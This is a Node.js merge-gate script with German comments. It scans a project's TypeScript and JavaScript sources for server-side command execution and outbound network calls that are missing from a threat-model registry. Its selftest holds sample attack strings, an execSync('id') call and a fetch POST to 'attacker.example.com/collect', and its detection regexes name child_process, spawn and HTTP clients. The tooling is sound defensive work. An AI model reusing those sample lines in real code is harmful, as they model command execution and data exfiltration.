#!/usr/bin/env node
/**
 * C-02 — New-Trust-Boundary-Detector. GEHÄRTET nach adversarialer Prüfung
 * (wf_ac30593b): scannt jetzt ALLE Quell-Endungen (.ts/.tsx/.mts/.cts/.js/.jsx/
 * .mjs/.cjs — der App-Router nutzt .tsx für Server-Actions) und erkennt Egress
 * über raw-`fetch` an eine ABSOLUTE http(s)-URL sowie node:http(s)/axios/got/undici
 * per Import (nicht als Wort — `"axios/"` im Bot-UA-Vergleich ist kein Egress).
 * Same-Origin-`fetch("/api/…")` und Browser-Client-Fetches lösen nichts aus.
 *
 *   (Standard)   Exit≠0 bei nicht-deklarierter Boundary.
 *   --selftest   je eine injizierte .tsx-Exec- und .ts-Egress-Datei MUSS gefangen werden.
 */
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");

// Server-Primitive (unabhängig vom Kontext ein Boundary).
const HARD = /@anthropic-ai\/sdk|nodemailer|createTransport|node:child_process|["']child_process["']|\bexecSync\b|\bexecFile(?:Sync)?\b|\bspawn(?:Sync)?\s*\(/;
// Netz-Egress: raw fetch an absolute http(s)-URL ODER Import von node:http(s)/axios/got/undici.
const EGRESS = /fetch\s*\(\s*[`"']https?:\/\/|(?:from|require\()\s*["'](?:node:https?|axios|got|undici|node-fetch)["']|https?\.request\s*\(/;

function walk(dir, out = []) {
  if (!fs.existsSync(dir)) return out;
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) walk(p, out);
    else if (/\.(ts|tsx|mts|cts|js|jsx|mjs|cjs)$/.test(e.name)) out.push(p);
  }
  return out;
}

function isBoundary(content) {
  return HARD.test(content) || EGRESS.test(content);
}

function boundaryFiles() {
  const files = [...walk(path.join(ROOT, "src/lib")), ...walk(path.join(ROOT, "src/app"))];
  return files
    .filter((f) => isBoundary(fs.readFileSync(f, "utf8")))
    .map((f) => path.relative(ROOT, f).replaceAll("\\", "/"));
}

const reg = JSON.parse(fs.readFileSync(path.join(ROOT, "governance/security/boundaries.json"), "utf8"));
const declared = new Set(Object.keys(reg.boundaries));
const found = boundaryFiles();
const undeclared = found.filter((f) => !declared.has(f));

if (process.argv.includes("--selftest")) {
  const execTsx = '"use server";\nimport { execSync } from "node:child_process";\nexport async function a(){ execSync("id"); }';
  const egressTs = 'export async function b(){ await fetch("https://attacker.example.com/collect", { method: "POST" }); }';
  const relTs = 'export async function c(){ await fetch("/api/likes", { method: "POST" }); }';
  if (!isBoundary(execTsx)) { console.error("⛔ Selbsttest: .tsx-Exec nicht als Boundary erkannt."); process.exit(1); }
  if (!isBoundary(egressTs)) { console.error("⛔ Selbsttest: externer fetch nicht als Boundary erkannt."); process.exit(1); }
  if (isBoundary(relTs)) { console.error("⛔ Selbsttest: Same-Origin-fetch fälschlich als Boundary erkannt."); process.exit(1); }
  // End-to-end: echte Temp-Dateien müssen in `undeclared` erscheinen.
  const tmpDir = path.join(ROOT, "src/lib/__atk__");
  fs.mkdirSync(tmpDir, { recursive: true });
  fs.writeFileSync(path.join(tmpDir, "x.tsx"), execTsx);
  fs.writeFileSync(path.join(tmpDir, "y.ts"), egressTs);
  const u = boundaryFiles().filter((f) => !declared.has(f)).filter((f) => f.includes("__atk__"));
  fs.rmSync(tmpDir, { recursive: true, force: true });
  if (u.length !== 2) { console.error(`⛔ Selbsttest: end-to-end erwartete 2 undeklarierte, bekam ${u.length}.`); process.exit(1); }
  console.log("   ✓ Selbsttest: .tsx-Exec + externer fetch gefangen; Same-Origin durchgelassen.");
}

for (const d of declared) {
  if (!found.includes(d)) console.warn(`   ⚠ boundaries.json nennt „${d}", das keinen Egress/Exec-Marker (mehr) trägt.`);
}

if (undeclared.length) {
  for (const f of undeclared) console.error(`   ✗ Neue Trust-Boundary ohne Threat-Model-Eintrag: ${f}`);
  console.error(`\n⛔ Boundary-Check: ${undeclared.length} nicht-deklarierte Integration/Egress. Merge blockiert (C-02).`);
  process.exit(1);
}
console.log(`[boundary-check] ${found.length} Egress-/Exec-Boundaries, alle im Threat-Model deklariert. Grün.`);
